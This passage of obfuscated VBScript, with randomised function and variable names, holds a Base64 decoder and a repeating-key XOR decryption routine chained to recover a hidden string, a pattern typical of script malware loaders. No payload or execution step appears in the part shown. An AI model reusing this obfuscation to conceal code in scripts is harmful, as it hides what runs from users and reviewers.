Ogflac(qtlGtDx, zEIFYs) Ogflac = BuQj(OqfP(qtlGtDx), zEIFYs) End Function Function OqfP(VKegEk) Dim GTjW, TRNGWrW(255) Dim YYiXYgA, OEBJwq, QhOl, eEry, SNwc, IYjT, DSoGLpT GTjW = "ABCDEFGH" GTjW = GTjW & "IJKLMNOP" GTjW = GTjW & "QRSTUVWX" GTjW = GTjW & "YZabcdef" GTjW = GTjW & "ghijklmn" GTjW = GTjW & "opqrstuv" GTjW = GTjW & "wxyz0123" GTjW = GTjW & "456789+/" For eEry = 0 To Len(GTjW) - 1 TRNGWrW(Asc(Mid(GTjW, eEry + 1, 1))) = eEry Next OEBJwq = 1 YYiXYgA = "" DSoGLpT = 0 For eEry = 1 To Len(VKegEk) IYjT = Asc(Mid(VKegEk, eEry, 1)) If IYjT = Asc("=") Then DSoGLpT = DSoGLpT + 1 Else SNwc = TRNGWrW(IYjT) Select Case (eEry - OEBJwq) Mod 4 Case 0 QhOl = SNwc * 4 Case 1 QhOl = QhOl + Int(SNwc / 16) YYiXYgA = YYiXYgA & Chr(QhOl) QhOl = (SNwc And 15) * 16 Case 2 QhOl = QhOl + Int(SNwc / 4) YYiXYgA = YYiXYgA & Chr(QhOl) QhOl = (SNwc And 3) * 64 Case 3 QhOl = QhOl + SNwc YYiXYgA = YYiXYgA & Chr(QhOl) OEBJwq = eEry + 1 End Select End If Next If OEBJwq <= Len(VKegEk) Then YYiXYgA = YYiXYgA & Chr(QhOl) End If OqfP = Left(YYiXYgA, ((Len(VKegEk) / 4) * 3) - DSoGLpT) End Function Function BuQj(yirSqN, hMRp) Dim utIz, pxscWC pxscWC = "" For utIz = 1 To Len(yirSqN) pxscWC = pxscWC & Chr(Asc(Mid(yirSqN, utIz, 1)) Xor Asc(Mid(hMRp, (utIz - 1) Mod Len(hMRp) + 1, 1))) Next BuQj = pxscWC End Function Function wdZc(KWReHJw,ZIuSf) Dim KRydqK, aESq, oXtBv, fnkMl, hDZw, rpxzjS, jRynFh
